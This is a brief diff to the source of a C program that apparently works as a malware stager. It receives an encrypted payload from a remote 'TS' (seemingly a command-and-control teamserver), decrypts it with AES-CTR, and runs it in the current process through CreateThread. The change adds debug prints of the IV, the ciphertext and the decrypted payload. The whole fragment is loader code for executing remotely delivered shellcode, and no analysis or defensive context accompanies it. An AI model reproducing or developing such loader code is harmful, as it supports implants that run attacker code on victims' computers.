@@ -628,7 +628,8 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 	debug_print("Recv %d byte payload from TS\n", ct_size);
-
+	debug_print("IV: %s\n", iv);
+	debug_print("Start of ct: %.10s\n", ct);
 	// Decrypt payload
 	struct AES_ctx ctx;
 	//AES_init_ctx(&ctx, key);
@@ -636,6 +637,7 @@ int main(int argc, char* argv[])
 	AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) ct, ct_size);
 
 	memcpy(payload, ct, ct_size);
+	debug_print("Start of payload: %.10s\n", payload);
 
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
